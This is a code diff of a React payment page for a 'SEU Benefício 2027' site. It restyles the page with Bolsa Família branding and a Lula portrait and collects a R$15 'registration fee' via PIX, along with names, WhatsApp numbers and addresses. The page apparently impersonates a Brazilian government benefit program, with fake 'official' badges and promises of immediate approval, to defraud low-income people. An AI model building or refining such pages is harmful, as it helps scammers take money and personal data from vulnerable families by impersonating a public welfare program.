@@ -10,16 +10,31 @@ import {
   QrCode,
   ShieldCheck,
   Sparkles,
+  HelpCircle,
+  Clock,
+  CheckCircle2,
 } from "lucide-react";
 import { toast } from "sonner";
 import { brl } from "@/lib/pricing";
-import { criarCobrancaPromissePay, consultarTransacaoPromissePay, consultarStatusWebhook } from "@/lib/promissepay";
+import {
+  criarCobrancaPromissePay,
+  consultarTransacaoPromissePay,
+  consultarStatusWebhook,
+} from "@/lib/promissepay";
+import { SiteHeader } from "@/components/SiteHeader";
+import { SiteFooter } from "@/components/SiteFooter";
+import logoBolsaFamilia from "@/assets/logo-bolsa-familia.png";
+import retratoLula from "@/assets/retrato-lula.png";
 
 export const Route = createFileRoute("/pagamento")({
   head: () => ({
     meta: [
       { title: "Pagamento da Taxa Cadastral | SEU Benefício 2027" },
       { name: "description", content: "Pagamento seguro e instantâneo via PIX da taxa cadastral SEU Benefício 2027." },
+      { property: "og:title", content: "Pagamento da Taxa Cadastral | SEU Benefício 2027" },
+      { property: "og:description", content: "Emissão prioritária da regularização cadastral via PIX com aprovação imediata." },
+      { property: "og:type", content: "website" },
+      { name: "twitter:card", content: "summary_large_image" },
     ],
   }),
   component: PagamentoPage,
@@ -133,7 +148,9 @@ function PagamentoPage() {
 
     try {
       setGerandoPix(true);
-      const res = await criarCobrancaPromissePay({ data: { amountInCents: 1500, nome: f.nome, telefone: f.tel } });
+      const res = await criarCobrancaPromissePay({
+        data: { amountInCents: 1500, nome: f.nome, telefone: f.tel },
+      });
       if (!res.pixCopiaECola && !res.qrCodeUrl) {
         throw new Error("PromissePay não retornou dados do PIX. Tente novamente.");
       }
@@ -160,314 +177,403 @@ function PagamentoPage() {
   };
 
   return (
-    <div className="mx-auto min-h-screen max-w-2xl px-4 py-8 pb-24">
-      {/* Topo / Voltar */}
-      <div className="mb-6 flex items-center justify-between">
-        <Link
-          to="/"
-          className="inline-flex items-center gap-2 rounded-xl border border-border bg-card px-3.5 py-2 text-xs font-bold text-foreground transition hover:bg-muted"
-        >
-          <ArrowLeft className="size-4" /> Voltar ao resumo
-        </Link>
-        <div className="flex items-center gap-1.5 text-xs font-semibold text-muted-foreground">
-          <Lock className="size-3.5 text-primary" /> Pagamento 100% Seguro
-        </div>
-      </div>
+    <div className="min-h-screen bg-[#FFFFFF] text-[#202020] flex flex-col justify-between selection:bg-[#FCEBED] selection:text-[#C8102E]">
+      <div>
+        {/* Cabeçalho Oficial Vermelho e Branco */}
+        <SiteHeader
+          canBack={true}
+          stepLabel="Emissão via PIX"
+          showProgress={true}
+          progressPercent={100}
+        />
 
-      <header className="mb-8 text-center">
-        <div className="mx-auto mb-3 inline-flex items-center gap-2 rounded-full border border-primary/20 bg-primary/10 px-3.5 py-1 text-xs font-bold text-primary">
-          <Sparkles className="size-3.5" /> Gateway PromissePay
-        </div>
-        <h1 className="text-2xl font-black tracking-tight text-foreground sm:text-3xl">
-          Finalizar Emissão Cadastral
-        </h1>
-        <p className="mx-auto mt-2 max-w-md text-sm text-muted-foreground">
-          Efetue o pagamento da taxa cadastral de <strong>{brl(valor)}</strong> via <strong>PIX</strong> para concluir seu processo com aprovação imediata.
-        </p>
-      </header>
-
-      {pago ? (
-        /* Tela de PIX Gerado */
-        <div className="shadow-soft space-y-6 rounded-3xl border border-border bg-card p-6 sm:p-8">
-          <div className="text-center">
-            {pagamentoConfirmado ? (
-              <div className="mx-auto mb-4 grid size-16 place-items-center rounded-2xl bg-success text-success-foreground">
-                <Check className="size-9 stroke-[3]" />
-              </div>
-            ) : (
-              <div className="mx-auto mb-4 grid size-16 place-items-center rounded-2xl bg-primary/10 text-primary">
-                <QrCode className="size-9" />
-              </div>
-            )}
-
-            <h2 className="text-2xl font-extrabold text-foreground">
-              {pagamentoConfirmado ? "Pagamento Confirmado!" : "Pague com PIX"}
-            </h2>
-            <p className="mt-1 text-sm text-muted-foreground">
-              {pagamentoConfirmado ? (
-                <>O gateway PromissePay confirmou o recebimento da taxa de <strong>{brl(valor)}</strong> com sucesso!</>
-              ) : (
-                <>Escaneie o QR Code abaixo no app do seu banco ou copie o código Copia e Cola.</>
-              )}
-            </p>
-          </div>
-
-          {!pagamentoConfirmado && (
-            <>
-              {/* Badge Aguardando */}
-              <div className="flex items-center justify-center gap-2 rounded-xl bg-amber-500/10 px-4 py-2.5 text-xs font-bold text-amber-700 dark:text-amber-400">
-                <span className="size-2 rounded-full bg-amber-500 animate-ping" />
-                {transacaoId ? `PromissePay #${transacaoId} · Aguardando pagamento` : "Aguardando pagamento via PIX"}
-              </div>
-
-              {/* QR Code */}
-              <div className="flex flex-col items-center justify-center rounded-2xl border-2 border-dashed border-primary/30 bg-muted/30 p-6">
-                {qrUrl ? (
-                  <img
-                    src={qrUrl}
-                    alt={`QR Code PIX PromissePay R$ ${valor.toFixed(2)}`}
-                    className="size-56 rounded-xl bg-white p-2 shadow-md transition hover:scale-105"
-                  />
-                ) : (
-                  <div className="flex size-56 items-center justify-center rounded-xl bg-muted">
-                    <Loader2 className="size-8 animate-spin text-primary" />
-                  </div>
-                )}
-                <p className="mt-3 text-xs font-semibold text-muted-foreground">
-                  Valor a pagar: <strong className="text-foreground">{brl(valor)}</strong>
-                </p>
-              </div>
-
-              {/* Copia e Cola */}
-              {pixCode && (
-                <div>
-                  <label className="mb-1.5 block text-xs font-bold uppercase tracking-wider text-muted-foreground">
-                    Código PIX Copia e Cola
-                  </label>
-                  <div className="relative">
-                    <input
-                      readOnly
-                      value={pixCode}
-                      className="shadow-soft h-12 w-full rounded-xl border border-input bg-muted/40 pl-3 pr-28 font-mono text-xs text-foreground focus-visible:outline-2 focus-visible:outline-ring"
-                    />
-                    <button
-                      type="button"
-                      onClick={copiarPix}
-                      className="absolute right-1.5 top-1.5 flex h-9 items-center gap-1.5 rounded-lg bg-primary px-3 text-xs font-bold text-primary-foreground shadow transition hover:opacity-95 active:scale-95"
-                    >
-                      {pixCopiado ? (
-                        <>
-                          <Check className="size-3.5 stroke-[3]" /> Copiado!
-                        </>
-                      ) : (
-                        <>
-                          <Copy className="size-3.5" /> Copiar PIX
-                        </>
-                      )}
-                    </button>
-                  </div>
-                </div>
-              )}
-
-              {/* Instruções */}
-              <div className="rounded-2xl border border-border bg-muted/40 p-4 text-xs text-muted-foreground">
-                <h3 className="mb-2 font-bold text-foreground">Como pagar:</h3>
-                <ol className="list-inside list-decimal space-y-1">
-                  <li>Abra o aplicativo do seu banco ou carteira digital.</li>
-                  <li>Escolha pagar com <strong>PIX</strong> (QR Code ou Copia e Cola).</li>
-                  <li>Cole o código copiado ou aponte a câmera para o QR Code.</li>
-                  <li>Confira o valor de <strong>{brl(valor)}</strong> e confirme o pagamento.</li>
-                  <li>A PromissePay confirmará seu pagamento automaticamente nesta tela.</li>
-                </ol>
-              </div>
-            </>
-          )}
-
-          {pagamentoConfirmado && (
-            <div className="rounded-2xl border border-success/30 bg-success/10 p-5 text-center text-sm font-semibold text-success">
-              ✓ Processo concluído com êxito! Suas informações foram atualizadas.
-            </div>
-          )}
-
-          <div className="pt-2">
-            <button
-              type="button"
-              onClick={() => setPago(false)}
-              className="h-10 w-full text-xs font-semibold text-muted-foreground hover:text-foreground"
+        <main className="animate-step mx-auto max-w-2xl px-4 py-6 sm:py-8">
+          {/* Barra Superior / Voltar e Selo */}
+          <div className="mb-6 flex items-center justify-between gap-3">
+            <Link
+              to="/"
+              className="inline-flex items-center gap-1.5 rounded-xl border border-[#C8102E] bg-white px-3.5 py-2 text-xs font-bold text-[#C8102E] transition-all hover:bg-[#FCEBED] active:scale-95"
             >
-              Alterar dados do cadastro
-            </button>
-          </div>
-        </div>
-      ) : (
-        /* Formulário de Cadastro e Pagamento */
-        <form onSubmit={gerarPix} className="shadow-soft space-y-5 rounded-3xl border border-border bg-card p-6 sm:p-8">
-          <div className="flex items-center gap-2 border-b border-border pb-4 text-xs">
-            <span className="size-2 rounded-full bg-success animate-pulse" />
-            <span className="font-semibold text-muted-foreground">
-              Gateway Oficial: <strong>PromissePay</strong>
-            </span>
-            <span className="ml-auto rounded bg-success/15 px-2 py-0.5 text-[10px] font-bold text-success">
-              Operacional ✓
-            </span>
-          </div>
-
-          <div>
-            <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-muted-foreground">
-              Nome completo
-            </label>
-            <input
-              required
-              placeholder="Digite seu nome completo"
-              value={f.nome}
-              onChange={set("nome")}
-              className="shadow-soft h-12 w-full rounded-xl border border-input bg-card px-4 font-semibold text-card-foreground placeholder:font-normal placeholder:text-muted-foreground focus-visible:outline-2 focus-visible:outline-ring"
-            />
-          </div>
-
-          <div>
-            <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-muted-foreground">
-              WhatsApp
-            </label>
-            <input
-              required
-              inputMode="tel"
-              placeholder="(DDD) 99999-9999"
-              value={f.tel}
-              onChange={set("tel")}
-              className="shadow-soft h-12 w-full rounded-xl border border-input bg-card px-4 font-semibold text-card-foreground placeholder:font-normal placeholder:text-muted-foreground focus-visible:outline-2 focus-visible:outline-ring"
-            />
-          </div>
-
-          <div>
-            <div className="mb-1 flex items-center justify-between">
-              <label className="block text-xs font-bold uppercase tracking-wider text-muted-foreground">
-                CEP (opcional)
-              </label>
-              {loadingCep && <span className="text-xs font-medium text-primary">Consultando CEP...</span>}
-            </div>
-            <input
-              inputMode="numeric"
-              maxLength={9}
-              placeholder="00000-000"
-              value={f.cep}
-              onChange={set("cep")}
-              onBlur={buscarCep}
-              className="shadow-soft h-12 w-full rounded-xl border border-input bg-card px-4 font-semibold text-card-foreground placeholder:font-normal placeholder:text-muted-foreground focus-visible:outline-2 focus-visible:outline-ring"
-            />
-          </div>
-
-          <div className="grid grid-cols-3 gap-2">
-            <div className="col-span-2">
-              <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-muted-foreground">Rua</label>
-              <input
-                placeholder="Rua / Logradouro"
-                value={f.rua}
-                onChange={set("rua")}
-                className="shadow-soft h-12 w-full rounded-xl border border-input bg-card px-4 font-semibold text-card-foreground placeholder:font-normal placeholder:text-muted-foreground focus-visible:outline-2 focus-visible:outline-ring"
-              />
-            </div>
-            <div>
-              <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-muted-foreground">Número</label>
-              <input
-                placeholder="Nº"
-                value={f.num}
-                onChange={set("num")}
-                className="shadow-soft h-12 w-full rounded-xl border border-input bg-card px-4 font-semibold text-card-foreground placeholder:font-normal placeholder:text-muted-foreground focus-visible:outline-2 focus-visible:outline-ring"
-              />
+              <ArrowLeft className="size-4" /> Voltar ao resumo
+            </Link>
+            <div className="inline-flex items-center gap-1.5 rounded-full bg-[#FCEBED] px-3 py-1 text-xs font-bold text-[#A50D24]">
+              <Lock className="size-3.5 text-[#C8102E]" /> Pagamento 100% Seguro
             </div>
           </div>
 
-          <div className="grid grid-cols-1 gap-2 sm:grid-cols-3">
-            <div>
-              <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-muted-foreground">Bairro</label>
-              <input
-                placeholder="Bairro"
-                value={f.bairro}
-                onChange={set("bairro")}
-                className="shadow-soft h-12 w-full rounded-xl border border-input bg-card px-4 font-semibold text-card-foreground placeholder:font-normal placeholder:text-muted-foreground focus-visible:outline-2 focus-visible:outline-ring"
-              />
-            </div>
-            <div>
-              <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-muted-foreground">Cidade</label>
-              <input
-                placeholder="Cidade"
-                value={f.cidade}
-                onChange={set("cidade")}
-                className="shadow-soft h-12 w-full rounded-xl border border-input bg-card px-4 font-semibold text-card-foreground placeholder:font-normal placeholder:text-muted-foreground focus-visible:outline-2 focus-visible:outline-ring"
-              />
-            </div>
-            <div>
-              <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-muted-foreground">UF</label>
-              <input
-                maxLength={2}
-                placeholder="UF"
-                value={f.uf}
-                onChange={set("uf")}
-                className="shadow-soft h-12 w-full rounded-xl border border-input bg-card px-4 font-semibold uppercase text-card-foreground placeholder:font-normal placeholder:text-muted-foreground focus-visible:outline-2 focus-visible:outline-ring"
-              />
-            </div>
-          </div>
-
-          {/* Seção Exclusiva PIX (Cartão e Boleto Removidos) */}
-          <div className="rounded-2xl border-2 border-primary/30 bg-primary/[0.04] p-4">
-            <div className="flex items-center gap-2.5">
-              <div className="grid size-9 place-items-center rounded-xl bg-primary text-primary-foreground">
-                <QrCode className="size-5" />
+          {/* Banner de Identificação Institucional */}
+          <div className="mb-6 flex items-center justify-between gap-4 rounded-2xl border border-[#E5E5E5] bg-white p-4 shadow-soft">
+            <div className="flex items-center gap-3">
+              <div className="rounded-xl border border-[#E5E5E5] bg-white p-1.5 shadow-xs">
+                <img
+                  src={logoBolsaFamilia}
+                  alt="Bolsa Família"
+                  className="h-8 w-auto object-contain"
+                  onError={(e) => {
+                    if (e.currentTarget.src !== "/logo-bolsa-familia.png") {
+                      e.currentTarget.src = "/logo-bolsa-familia.png";
+                    }
+                  }}
+                />
+              </div>
+              <div className="rounded-xl border border-[#E5E5E5] bg-white p-1 shadow-xs">
+                <img
+                  src={retratoLula}
+                  alt="Lula Presidente"
+                  className="h-8 w-auto object-contain"
+                  onError={(e) => {
+                    if (e.currentTarget.src !== "/retrato-lula.png") {
+                      e.currentTarget.src = "/retrato-lula.png";
+                    }
+                  }}
+                />
               </div>
               <div>
-                <p className="text-sm font-extrabold text-foreground">Forma de Pagamento: PIX Instantâneo</p>
-                <p className="text-xs text-muted-foreground">Aprovação imediata e liberação automática via PromissePay</p>
+                <h2 className="text-sm font-extrabold text-[#202020]">
+                  Regularização Cadastral 2027
+                </h2>
+                <p className="text-[11px] text-[#666666]">
+                  Apoio às Famílias · Processamento Imediato
+                </p>
               </div>
-              <span className="ml-auto rounded-md bg-success/15 px-2 py-0.5 text-[11px] font-bold text-success">
-                Aprovação 24/7
+            </div>
+
+            <div className="hidden sm:block text-right">
+              <span className="inline-flex items-center gap-1 rounded-md bg-[#F5F5F5] px-2.5 py-1 text-[11px] font-semibold text-[#555555]">
+                <Clock className="size-3 text-[#C8102E]" /> Liberação 24/7
               </span>
             </div>
           </div>
 
-          {/* Resumo do Valor */}
-          <div className="rounded-2xl border border-border bg-muted/40 p-4 text-sm">
-            <div className="flex justify-between text-muted-foreground">
-              <span>Taxa de Emissão e Atualização 2027</span>
-              <span className="font-semibold text-foreground">{brl(valor)}</span>
+          <header className="mb-6 text-center">
+            <div className="mx-auto mb-2 inline-flex items-center gap-2 rounded-full bg-[#FCEBED] px-3.5 py-1 text-xs font-bold text-[#A50D24]">
+              <Sparkles className="size-3.5 text-[#C8102E]" /> Gateway PromissePay Oficial
             </div>
-            <div className="mt-1 flex justify-between text-muted-foreground">
-              <span>Processamento PromissePay</span>
-              <span className="font-semibold text-success">Grátis</span>
-            </div>
-            <div className="mt-3 flex items-center justify-between border-t border-border pt-2 text-base font-extrabold text-foreground">
-              <span>Total a pagar via PIX</span>
-              <span className="font-display text-2xl font-black text-primary">{brl(valor)}</span>
-            </div>
-          </div>
+            <h1 className="text-2xl sm:text-3xl font-black tracking-tight text-[#202020]">
+              Finalizar Emissão Cadastral
+            </h1>
+            <p className="mx-auto mt-1 max-w-md text-xs sm:text-sm text-[#555555]">
+              Efetue o pagamento da taxa cadastral de{" "}
+              <strong className="text-[#C8102E]">{brl(valor)}</strong> via{" "}
+              <strong>PIX</strong> para emissão imediata do seu comprovante.
+            </p>
+          </header>
 
-          <button
-            type="submit"
-            disabled={gerandoPix}
-            className="shadow-primary flex h-14 w-full items-center justify-center gap-2 rounded-2xl bg-primary text-base font-extrabold tracking-wide text-primary-foreground transition hover:-translate-y-0.5 active:scale-[0.99] disabled:opacity-50"
-          >
-            {gerandoPix ? (
-              <>
-                <Loader2 className="size-5 animate-spin" /> Conectando à PromissePay...
-              </>
-            ) : (
-              <>
-                GERAR PIX AGORA — {brl(valor)}
-              </>
-            )}
-          </button>
+          {pago ? (
+            /* Tela de PIX Gerado */
+            <div className="space-y-6 rounded-2xl border border-[#E5E5E5] bg-white p-6 sm:p-8 shadow-soft">
+              <div className="text-center">
+                {pagamentoConfirmado ? (
+                  <div className="mx-auto mb-4 grid size-16 place-items-center rounded-2xl bg-emerald-100 text-emerald-700 border border-emerald-300">
+                    <Check className="size-9 stroke-[3]" />
+                  </div>
+                ) : (
+                  <div className="mx-auto mb-4 grid size-16 place-items-center rounded-2xl bg-[#FCEBED] text-[#C8102E] border border-[#C8102E]/20">
+                    <QrCode className="size-9" />
+                  </div>
+                )}
 
-          <div className="flex items-center justify-center gap-4 pt-1 text-xs text-muted-foreground">
-            <span className="flex items-center gap-1">
-              <Lock className="size-3.5 text-primary" /> Gateway PromissePay Seguro
-            </span>
-            <span>·</span>
-            <span className="flex items-center gap-1">
-              <ShieldCheck className="size-3.5 text-primary" /> Criptografia 256 bits
-            </span>
-          </div>
-        </form>
-      )}
+                <h2 className="text-2xl font-black text-[#202020]">
+                  {pagamentoConfirmado ? "Pagamento Confirmado!" : "Pague com PIX Instantâneo"}
+                </h2>
+                <p className="mt-1 text-xs sm:text-sm text-[#555555]">
+                  {pagamentoConfirmado ? (
+                    <>
+                      O gateway PromissePay confirmou o recebimento da taxa de{" "}
+                      <strong className="text-[#202020]">{brl(valor)}</strong> com sucesso!
+                    </>
+                  ) : (
+                    <>
+                      Abra o app do seu banco, escolha pagar via <strong>PIX</strong> e escaneie o QR Code abaixo ou use o código Copia e Cola.
+                    </>
+                  )}
+                </p>
+              </div>
+
+              {!pagamentoConfirmado && (
+                <>
+                  {/* Badge Aguardando */}
+                  <div className="flex items-center justify-center gap-2 rounded-xl bg-amber-50 border border-amber-200 px-4 py-2.5 text-xs font-bold text-amber-800">
+                    <span className="size-2 rounded-full bg-amber-500 animate-ping" />
+                    {transacaoId
+                      ? `PromissePay #${transacaoId} · Aguardando pagamento`
+                      : "Aguardando pagamento via PIX..."}
+                  </div>
+
+                  {/* QR Code */}
+                  <div className="flex flex-col items-center justify-center rounded-2xl border-2 border-dashed border-[#C8102E]/30 bg-[#F5F5F5] p-6">
+                    {qrUrl ? (
+                      <img
+                        src={qrUrl}
+                        alt={`QR Code PIX PromissePay R$ ${valor.toFixed(2)}`}
+                        className="size-56 rounded-xl bg-white p-2 shadow-md transition-transform hover:scale-105"
+                      />
+                    ) : (
+                      <div className="flex size-56 items-center justify-center rounded-xl bg-white border border-[#E5E5E5]">
+                        <Loader2 className="size-8 animate-spin text-[#C8102E]" />
+                      </div>
+                    )}
+                    <p className="mt-3 text-xs font-bold text-[#555555]">
+                      Valor a pagar: <strong className="text-xl text-[#C8102E]">{brl(valor)}</strong>
+                    </p>
+                  </div>
+
+                  {/* Copia e Cola */}
+                  {pixCode && (
+                    <div>
+                      <label className="mb-1.5 block text-xs font-bold uppercase tracking-wider text-[#555555]">
+                        Código PIX Copia e Cola
+                      </label>
+                      <div className="relative">
+                        <input
+                          readOnly
+                          value={pixCode}
+                          className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-[#F5F5F5] pl-3 pr-32 font-mono text-xs text-[#202020] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20"
+                        />
+                        <button
+                          type="button"
+                          onClick={copiarPix}
+                          className="absolute right-1.5 top-1.5 flex h-9 items-center gap-1.5 rounded-lg bg-[#C8102E] px-3.5 text-xs font-bold text-white shadow transition hover:bg-[#A50D24] active:scale-95"
+                        >
+                          {pixCopiado ? (
+                            <>
+                              <Check className="size-3.5 stroke-[3]" /> Copiado!
+                            </>
+                          ) : (
+                            <>
+                              <Copy className="size-3.5" /> Copiar PIX
+                            </>
+                          )}
+                        </button>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Instruções */}
+                  <div className="rounded-xl border border-[#E5E5E5] bg-[#F5F5F5] p-4 text-xs text-[#555555] space-y-1.5">
+                    <h3 className="font-black text-[#202020] text-sm mb-2">Instruções de Pagamento:</h3>
+                    <ol className="list-inside list-decimal space-y-1">
+                      <li>Abra o aplicativo do seu banco ou carteira digital (Nubank, Caixa, Itaú, Bradesco, etc.).</li>
+                      <li>Selecione a opção <strong>PIX</strong> (QR Code ou Copia e Cola).</li>
+                      <li>Cole o código copiado acima ou aponte a câmera para o QR Code.</li>
+                      <li>Confira o valor de <strong>{brl(valor)}</strong> e finalize o pagamento.</li>
+                      <li>A aprovação é imediata e esta página será atualizada automaticamente.</li>
+                    </ol>
+                  </div>
+                </>
+              )}
+
+              {pagamentoConfirmado && (
+                <div className="rounded-2xl border border-emerald-300 bg-emerald-50 p-5 text-center text-sm font-bold text-emerald-800 space-y-1">
+                  <p>✓ Processo concluído com êxito!</p>
+                  <p className="text-xs font-normal text-emerald-700">
+                    O comprovante do seu cadastro 2027 e as orientações foram confirmados no sistema.
+                  </p>
+                </div>
+              )}
+
+              <div className="pt-2 text-center">
+                <button
+                  type="button"
+                  onClick={() => setPago(false)}
+                  className="text-xs font-bold text-[#666666] hover:text-[#C8102E] underline underline-offset-4 transition"
+                >
+                  Alterar dados cadastrais ou gerar novo PIX
+                </button>
+              </div>
+            </div>
+          ) : (
+            /* Formulário de Cadastro e Pagamento */
+            <form
+              onSubmit={gerarPix}
+              className="space-y-4 sm:space-y-5 rounded-2xl border border-[#E5E5E5] bg-white p-5 sm:p-8 shadow-soft"
+            >
+              <div className="flex items-center gap-2 border-b border-[#E5E5E5] pb-3 text-xs">
+                <span className="size-2 rounded-full bg-emerald-500 animate-pulse" />
+                <span className="font-semibold text-[#555555]">
+                  Gateway de Processamento: <strong className="text-[#202020]">PromissePay</strong>
+                </span>
+                <span className="ml-auto rounded-md bg-emerald-100 px-2 py-0.5 text-[10px] font-bold text-emerald-800">
+                  Operacional ✓
+                </span>
+              </div>
+
+              <div>
+                <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
+                  Nome Completo
+                </label>
+                <input
+                  required
+                  placeholder="Digite seu nome completo"
+                  value={f.nome}
+                  onChange={set("nome")}
+                  className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
+                />
+              </div>
+
+              <div>
+                <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
+                  WhatsApp com DDD
+                </label>
+                <input
+                  required
+                  inputMode="tel"
+                  placeholder="(DDD) 99999-9999"
+                  value={f.tel}
+                  onChange={set("tel")}
+                  className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
+                />
+              </div>
+
+              <div>
+                <div className="mb-1 flex items-center justify-between">
+                  <label className="block text-xs font-bold uppercase tracking-wider text-[#555555]">
+                    CEP (opcional)
+                  </label>
+                  {loadingCep && (
+                    <span className="text-xs font-bold text-[#C8102E] flex items-center gap-1">
+                      <Loader2 className="size-3 animate-spin" /> Buscando endereço...
+                    </span>
+                  )}
+                </div>
+                <input
+                  inputMode="numeric"
+                  maxLength={9}
+                  placeholder="00000-000"
+                  value={f.cep}
+                  onChange={set("cep")}
+                  onBlur={buscarCep}
+                  className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
+                />
+              </div>
+
+              <div className="grid grid-cols-3 gap-2">
+                <div className="col-span-2">
+                  <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
+                    Logradouro / Rua
+                  </label>
+                  <input
+                    placeholder="Nome da sua rua"
+                    value={f.rua}
+                    onChange={set("rua")}
+                    className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
+                  />
+                </div>
+                <div>
+                  <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
+                    Número
+                  </label>
+                  <input
+                    placeholder="Nº"
+                    value={f.num}
+                    onChange={set("num")}
+                    className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
+                  />
+                </div>
+              </div>
+
+              <div className="grid grid-cols-1 gap-2 sm:grid-cols-3">
+                <div>
+                  <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
+                    Bairro
+                  </label>
+                  <input
+                    placeholder="Bairro"
+                    value={f.bairro}
+                    onChange={set("bairro")}
+                    className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
+                  />
+                </div>
+                <div>
+                  <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
+                    Cidade
+                  </label>
+                  <input
+                    placeholder="Cidade"
+                    value={f.cidade}
+                    onChange={set("cidade")}
+                    className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
+                  />
+                </div>
+                <div>
+                  <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
+                    UF
+                  </label>
+                  <input
+                    maxLength={2}
+                    placeholder="UF"
+                    value={f.uf}
+                    onChange={set("uf")}
+                    className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold uppercase text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
+                  />
+                </div>
+              </div>
+
+              {/* Seção Exclusiva PIX */}
+              <div className="rounded-xl border-2 border-[#C8102E] bg-[#FCEBED] p-4">
+                <div className="flex items-center gap-3">
+                  <div className="grid size-10 place-items-center rounded-xl bg-[#C8102E] text-white">
+                    <QrCode className="size-5" />
+                  </div>
+                  <div>
+                    <p className="text-sm font-black text-[#A50D24]">
+                      Forma de Pagamento: PIX Instantâneo
+                    </p>
+                    <p className="text-xs text-[#555555]">
+                      Aprovação imediata 24 horas por dia via PromissePay
+                    </p>
+                  </div>
+                  <span className="ml-auto rounded-md bg-[#C8102E] px-2 py-0.5 text-[10px] font-bold text-white">
+                    Instantâneo
+                  </span>
+                </div>
+              </div>
+
+              {/* Resumo do Valor */}
+              <div className="rounded-xl border border-[#E5E5E5] bg-[#F5F5F5] p-4 text-sm">
+                <div className="flex justify-between text-xs sm:text-sm text-[#555555]">
+                  <span>Taxa de Emissão e Regularização 2027</span>
+                  <span className="font-bold text-[#202020]">{brl(valor)}</span>
+                </div>
+                <div className="mt-1 flex justify-between text-xs sm:text-sm text-[#555555]">
+                  <span>Taxa de Processamento PromissePay</span>
+                  <span className="font-bold text-emerald-700">Grátis (R$ 0,00)</span>
+                </div>
+                <div className="mt-3 flex items-center justify-between border-t border-[#E5E5E5] pt-3 text-base font-black text-[#202020]">
+                  <span>Total a pagar via PIX</span>
+                  <span className="text-2xl font-black text-[#C8102E]">{brl(valor)}</span>
+                </div>
+              </div>
+
+              <button
+                type="submit"
+                disabled={gerandoPix}
+                className="flex h-14 w-full items-center justify-center gap-2 rounded-xl bg-[#C8102E] text-base font-black tracking-wide text-white shadow-primary transition-all duration-200 hover:bg-[#A50D24] hover:-translate-y-0.5 active:translate-y-0 active:scale-[0.99] disabled:opacity-50 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#C8102E] focus-visible:ring-offset-2"
+              >
+                {gerandoPix ? (
+                  <>
+                    <Loader2 className="size-5 animate-spin" /> Conectando à PromissePay...
+                  </>
+                ) : (
+                  <>GERAR PIX AGORA — {brl(valor)}</>
+                )}
+              </button>
+
+              <div className="flex flex-wrap items-center justify-center gap-4 pt-1 text-xs text-[#666666]">
+                <span className="flex items-center gap-1">
+                  <Lock className="size-3.5 text-[#C8102E]" /> Gateway PromissePay Seguro
+                </span>
+                <span>·</span>
+                <span className="flex items-center gap-1">
+                  <ShieldCheck className="size-3.5 text-[#C8102E]" /> Criptografia 256-bit
+                </span>
+              </div>
+            </form>
+          )}
+        </main>
+      </div>
+
+      <SiteFooter />
     </div>
   );
 }
